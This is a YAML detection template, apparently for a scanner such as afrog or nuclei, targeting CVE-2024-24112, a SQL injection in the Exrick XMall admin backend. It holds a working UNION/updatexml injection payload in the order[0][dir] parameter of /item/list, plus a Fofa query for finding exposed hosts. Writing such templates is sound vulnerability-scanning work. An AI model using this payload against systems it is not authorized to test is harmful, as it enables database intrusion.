id: CVE-2024-24112

info:
  name: Exrick XMall 开源商城 SQL注入漏洞
  author: zan8in
  severity: high
  description: |
    Fofa: app="XMall-后台管理系统"
  reference:
    - https://mp.weixin.qq.com/s/HqVQrUr6iRv94BmrVd_gOw
  tags: XMALL-background management system
flow: |
  http("r0")

http:
  - id: "r0"
    raw:
      - |
        GET /item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,md5(123),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136 HTTP/1.1
        Host: {{Hostname}}

        

    matchers:
      - type: dsl
        dsl:
          - contains(body,"XPATH syntax error:") && contains(body,"202cb962ac59075b964b07152d23")
        condition: and

